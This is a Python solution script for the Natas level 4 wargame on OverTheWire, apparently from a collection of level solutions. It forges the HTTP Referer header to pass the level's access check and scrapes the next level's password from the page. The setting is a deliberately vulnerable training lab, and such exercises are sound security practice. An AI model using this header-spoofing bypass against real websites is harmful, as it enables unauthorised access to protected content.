import requests

import natas3
from helpers import between


def solution() -> str:
    url = "http://natas4.natas.labs.overthewire.org"
    username = "natas4"
    password = natas3.solution()

    # First visit displays message:
    # Access disallowed. You are visiting from "" while authorized users
    # should come only from "http://natas5.natas.labs.overthewire.org/"
    #
    # There is a "Refresh page" link that changes the "visiting from"
    # string in the message to
    # http://natas4.natas.labs.overthewire.org/index.php
    # This suggests that the app is using the "Referer" header.

    referer = "http://natas5.natas.labs.overthewire.org/"
    s = requests.Session()
    s.headers.update({"Referer": referer})
    r = s.get(url, auth=(username, password))
    start = "The password for natas5 is "
    end = "\n<br/>"
    natas5_password = between(r.text, start, end)
    return natas5_password
